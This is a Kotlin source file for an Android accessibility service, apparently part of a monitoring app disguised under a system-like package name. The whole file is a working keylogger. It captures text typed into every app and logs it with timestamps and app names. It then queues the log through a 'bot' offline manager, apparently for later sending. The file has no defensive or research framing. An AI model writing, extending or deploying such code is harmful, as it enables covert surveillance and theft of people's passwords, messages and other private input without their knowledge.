package com.system.superiormonitor.service

import android.accessibilityservice.AccessibilityService
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import com.system.superiormonitor.bot.OfflineManager
import com.system.superiormonitor.data.PrefsManager
import com.system.superiormonitor.util.LogCategory
import com.system.superiormonitor.util.LogManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class MonitorAccessibilityService : AccessibilityService() {

    private val scope = CoroutineScope(Dispatchers.Default)
    private var pauseJob: Job? = null
    
    private var currentCapturedText = ""
    private var currentPackageName = ""
    private val currentBatch = StringBuilder()
    private val dateFormat = SimpleDateFormat("HH:mm:ss", Locale.getDefault())

    private val screenOffReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            if (intent?.action == Intent.ACTION_SCREEN_OFF) {
                commitCurrentText("SCREEN_OFF")
            }
        }
    }

    override fun onServiceConnected() {
        try {
            super.onServiceConnected()
            val filter = IntentFilter(Intent.ACTION_SCREEN_OFF)
            registerReceiver(screenOffReceiver, filter)
            LogManager.log(LogCategory.SYSTEM, "Accessibility Service connected")
        } catch (e: Exception) {
            Log.e("MonitorAccessibility", "Error in onServiceConnected", e)
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        try {
            if (event == null) return
            val prefs = PrefsManager.getInstance(this)
            if (!prefs.keyEventsEnabled) return

            when (event.eventType) {
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                    val packageName = event.packageName?.toString() ?: "unknown"
                    val text = event.text.joinToString("")
                    if (text.isNotEmpty()) {
                        currentPackageName = packageName
                        currentCapturedText = text
                        resetPauseTimer()
                    }
                }
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                    val packageName = event.packageName?.toString() ?: "unknown"
                    if (packageName != currentPackageName) {
                        commitCurrentText("WINDOW_CHANGED")
                    }
                }
            }
        } catch (e: Exception) {
            Log.e("MonitorAccessibility", "Error processing accessibility event", e)
        }
    }

    private fun resetPauseTimer() {
        pauseJob?.cancel()
        pauseJob = scope.launch {
            delay(2000L) // Wait 2 seconds for a pause in typing
            commitCurrentText("PAUSE")
        }
    }

    private fun commitCurrentText(trigger: String) {
        if (currentCapturedText.isBlank()) return

        val time = dateFormat.format(Date())
        val entry = "[$time][$currentPackageName] $currentCapturedText"
        currentBatch.append(entry).append("\n")
        
        // Write the batch to file
        val batchText = currentBatch.toString()
        if (batchText.isNotBlank()) {
            OfflineManager.queueOnly(this, batchText.trim(), "keyevents", "offline_keyevents.txt")
            currentBatch.clear()
        }
        
        currentCapturedText = ""
    }

    override fun onInterrupt() {
        try {
            commitCurrentText("INTERRUPT")
            LogManager.log(LogCategory.SYSTEM, "Accessibility Service interrupted")
        } catch (e: Exception) {
            Log.e("MonitorAccessibility", "Error in onInterrupt", e)
        }
    }

    override fun onDestroy() {
        try {
            commitCurrentText("DESTROY")
            unregisterReceiver(screenOffReceiver)
        } catch (e: Exception) {
            Log.e("MonitorAccessibility", "Error in onDestroy", e)
        }
        super.onDestroy()
    }
}
